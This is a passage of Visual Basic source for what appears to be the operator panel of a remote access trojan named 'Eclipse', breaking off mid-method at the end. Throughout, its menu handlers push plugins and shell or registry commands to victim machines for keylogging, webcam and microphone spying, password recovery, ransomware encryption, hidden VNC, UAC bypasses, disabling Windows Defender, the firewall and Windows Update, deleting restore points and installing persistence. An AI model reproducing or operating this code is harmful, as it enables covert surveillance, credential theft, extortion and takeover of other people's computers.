    Private Sub PreventSleepToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("PSleep" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\PreventSleep.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("xxx")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ppp")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ClipboardManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("cbb")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("|||")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub OpenDownloadsFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenDownloadsFolderToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & Lv1.SelectedItems(0).SubItems(2).Text) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & Lv1.SelectedItems(0).SubItems(2).Text)
                End If
                Process.Start(Application.StartupPath & "\Downloads" & "\" & Lv1.SelectedItems(0).SubItems(2).Text)
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ChangeWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWallpaperToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
            Dim openFileDialog2 As OpenFileDialog = openFileDialog
            openFileDialog2.Title = "Select Image"
            openFileDialog2.Filter = "(*.jpg)|*.jpg"
            Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
            If flag Then
                Dim paht As String = openFileDialog.FileName
                Try
                    Dim B As Byte() = SB("WL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Wallpaper.dll")) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(paht)))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If

        End If
    End Sub

    Private Sub DeleteRestorePointsToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("DelP" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\DeletePoints.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub InstalledProgramsToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PRG")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub WebCamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WebCamToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("WBCM")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("KL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Keylogger.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub



    Private Sub GetToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("KLget")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ActiveWindowsToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ACT")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub SendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendToolStripMenuItem.Click

        If Lv1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Set MessageBox", "MessageBox", "Hello World!")
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("msgg" & Settings.SPL & str3)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If

    End Sub


    Private Sub FileSeacherToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileSeacherToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim f As New FileSeacher
            f.StartPosition = FormStartPosition.CenterParent
            f.ShowDialog()
        End If
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim f As New Ransomware
            f.ShowDialog()
        End If
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("RDEC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Ransomware.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ListeningToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Try
            Dim str3 As String = Interaction.InputBox("Set Port", "[ HVNC Server ]", "8000")

            If (str3.Length = 0) Then
            Else
                Dim pxx As Process = Process.Start(AppDomain.CurrentDomain.BaseDirectory + "EclipseClient\Tools\HVNC-Server.exe", str3)
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

    End Sub

    Private Sub RunToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Set Host:Port", "[ HVNC Client ] " + "Selected [" & Lv1.SelectedItems.Count & "]", "127.0.0.1:8000")
            If (str3.Length = 0) Then
            Else

                Try
                    Dim B As Byte() = SB("HVNC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\HVNC.dll")) & Settings.SPL & str3.Split(":")(0) & Settings.SPL & str3.Split(":")(1))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If
    End Sub

    Private Sub NgrokToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ngrok")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub StopToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "taskkill.exe /im ngrok.exe /f")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub StartToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            If Lv1.SelectedItems.Count > 1 Then
                MessageBox.Show("This Works With Only One Connection!")
            Else
                If Lv1.Items(Lv1.FocusedItem.Index).SubItems(8).Text = "True" Then

                    Dim B As Byte() = SB("hrdp")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next

                Else
                    MessageBox.Show("This Feature Requires UAC Permissions!")
                End If
            End If
        End If
    End Sub

    Private Sub Method2ToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\UACBypass.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Method1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Method1ToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Cmstp-Bypass.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RecoveryManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PassR")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub EnableToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Settings.SPL & "0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Settings.SPL & "1")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub EnableToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "netsh advfirewall set allprofiles state on")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "netsh advfirewall set allprofiles state off")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub EnableToolStripMenuItem2_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Settings.SPL & "1")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem2_Click(sender As Object, e As EventArgs)

        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Settings.SPL & "0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableWindowsDefenderToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\DisableWD.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub
    Private Sub StopWindowsUpdateToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "cmd.exe /c net stop wuauserv && sc config wuauserv start= disabled")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs)
        Dim fileName As String = "Eclipse Binder.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The binder file was not found.", "Eclipse", MessageBoxButtons.OK)
        End If
    End Sub

    Private Sub CreateWormToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim f As New Builder
        Helper.aes_function()
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub

    Private Sub AboutToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        Dim f As New About
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub

    Private Sub HTADownloaderToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim Frm_Download As New Downloader
        Trocar_Painel_Downloader(Frm_Download)

        Guna2Transition1.Hide(Panel_Binder)
        Guna2Transition1.Hide(Panel_IconChanger)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(Panel_vitimas)
        Guna2Transition1.Hide(Panel_builder)
        Guna2Transition1.ShowSync(Panel_Downloader)
    End Sub

    Private Sub InformationToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("getinfo")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub EnableToolStripMenuItem3_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Settings.SPL & "0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem3_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Settings.SPL & "1")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub EnableToolStripMenuItem4_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\BlankScreen.dll")) & Settings.SPL & "0")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DisableToolStripMenuItem4_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\BlankScreen.dll")) & Settings.SPL & "1")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RunPEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunPEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim f As New RunPE
            f.StartPosition = FormStartPosition.CenterParent
            f.ShowDialog()
        End If
    End Sub

    Private Sub Net35ToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("NETINS" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\NetInstall.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub RunAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\AskUAC.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ComputerdefaultsToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Computerdefaults.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub WDExclusionToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\WDExclusion.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub StartUpToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Install.dll")) & Settings.SPL & "1")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RegistryToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Install.dll")) & Settings.SPL & "2")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub SchtasksToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Install.dll")) & Settings.SPL & "3")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
        Dim Frm_IconChanger As New IconChanger
        Trocar_Painel_IconChanger(Frm_IconChanger)

        Guna2Transition1.Hide(Panel_Downloader)
        Guna2Transition1.Hide(Panel_Binder)
        Guna2Transition1.Hide(Panel_builder)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(Panel_vitimas)
        Guna2Transition1.ShowSync(Panel_IconChanger)
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("TCPV")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrophoneToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("MICL")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Xchat")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Public Sub PasTimeToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("JustFun" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Pastime.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub SystemSoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemSoundToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Wsound")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub



    Private Sub BlockClientsToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim f As New BlockClients
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub



    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        Lv2.Items.Clear()
    End Sub

    Private Sub IPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles IPToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim out As String
            Dim F As New BlockClients

            Try
                For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Block", Nothing), (","))
                    If Not XX = Nothing Then
                        If Not F.ListBox1.Items.Contains(XX) Then
                            F.ListBox1.Items.Add(XX)
                        End If
                    End If
                Next
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try


            Try
                out = Nothing
                For Each C As ListViewItem In Lv1.SelectedItems
                    If Not F.ListBox1.Items.Contains(C.SubItems(0).Text) Then
                        F.ListBox1.Items.Add(C.SubItems(0).Text)
                    End If
                Next

                F.StartPosition = FormStartPosition.CenterParent
                F.ShowDialog()

            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

        End If
    End Sub

    Private Sub IDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles IDToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim out As String
            Dim F As New BlockClients

            Try
                For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Block", Nothing), (","))
                    If Not XX = Nothing Then
                        If Not F.ListBox1.Items.Contains(XX) Then
                            F.ListBox1.Items.Add(XX)
                        End If
                    End If
                Next
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try


            Try
                out = Nothing
                For Each C As ListViewItem In Lv1.SelectedItems
                    If Not F.ListBox1.Items.Contains(C.SubItems(2).Text) Then
                        F.ListBox1.Items.Add(C.SubItems(2).Text)
                    End If
                Next

                F.StartPosition = FormStartPosition.CenterParent
                F.ShowDialog()

            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

        End If
    End Sub

    Private Sub NoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoteToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim str3 As String = Interaction.InputBox("Enter Your Note", "Note")


            Dim B As Byte() = SB("SNote" & Settings.SPL & str3)
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


            Try
                For Each C As ListViewItem In Lv1.SelectedItems
                    If str3 = Nothing Then
                        C.SubItems(11).Text = "Nothing"
                    Else
                        C.SubItems(11).Text = str3
                    End If
                Next
                Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub

    Private Sub StopToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem2.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("closeKL")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        If trans Then Me.Opacity = 1.0
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Me.Opacity = 0.95
    End Sub




    Private Sub XHVNCToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub CreateWormToolStripMenuItem_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub ClientMenu_Opening(sender As Object, e As CancelEventArgs) Handles ClientMenu.Opening

    End Sub

    Private Sub BuilderToolStripMenuItem_Click_1(sender As Object, e As EventArgs)
